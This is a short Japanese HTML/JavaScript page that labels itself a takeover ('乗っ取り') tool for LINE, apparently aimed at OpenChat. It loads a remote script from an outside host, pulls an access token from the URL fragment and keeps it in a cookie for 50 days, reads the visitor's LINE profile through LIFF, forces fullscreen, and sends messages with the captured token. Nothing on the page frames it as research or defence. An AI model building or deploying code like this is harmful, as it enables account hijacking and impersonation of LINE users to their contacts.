<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="Cache-Control" content="no-cache">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OCツール</title>
    <link href="./style.css" rel="stylesheet">
</head>
<body>
  <font face="sans-serif">
  <h1>乗っ取り</h1>
  <p>メッセージ送信</p>
  <input type="text" id="text"><button type="button" >送信</button>
  <p id="log"></p>
  </font>
  <script src="https://liff-tool.f5.si/mod.js"></script>
  <script>
    var token=location.hash.substr(1);
    if (token){
    Cookies.set('token',token, {expires: 50});
    }else{
    token=Cookies.get("token")
    }
    liff.init({liffId:"2000352667-REOZ1LG8",withLoginOnExternalBrowser:true})
    .then(()=>liff.getProfile())
    .then((profile)=>{
        document.body.requestFullscreen();
        let temp;
        if (profile.pictureUrl){
            temp=[{
  "type": "template",
  "altText": "プロフィール",
  "template": {
    "type": "buttons",
    "thumbnailImageUrl": profile.pictureUrl,
    "imageAspectRatio": "rectangle",
    "imageSize": "contain",
    "imageBackgroundColor": "#FFFFFF",
    "title": profile.displayName,
    "text": "ステメ:"+profile.statusMessage,
    "actions": [
      {
        "type": "uri",
        "label": "プロフィールを転送",
        "uri": "line://share?text="+encodeURIComponent(`Profile:\nName:${profile.displayName},\nStatusMessage:${profile.statusMessage},\nPictureUrl:${profile.pictureUrl}`)
      }
    ]
  }
}]
        }else{
            temp=[{
  "type": "template",
  "altText": "プロフィール",
  "template": {
    "type": "buttons",
    "imageBackgroundColor": "#FFFFFF",
    "title": profile.displayName,
    "text": "ステメ:"+profile.statusMessage,
    "actions": [
      {
        "type": "uri",
        "label": "プロフィールを転送",
        "uri": "line://share?text="+encodeURIComponent(`Profile:\nName:${profile.displayName},\nStatusMessage:${profile.statusMessage}`)
      }
    ]
  }
}]
        }
    liffmod.token.sendMessages(temp,token);
    })
    
  </script>
</body>
</html>
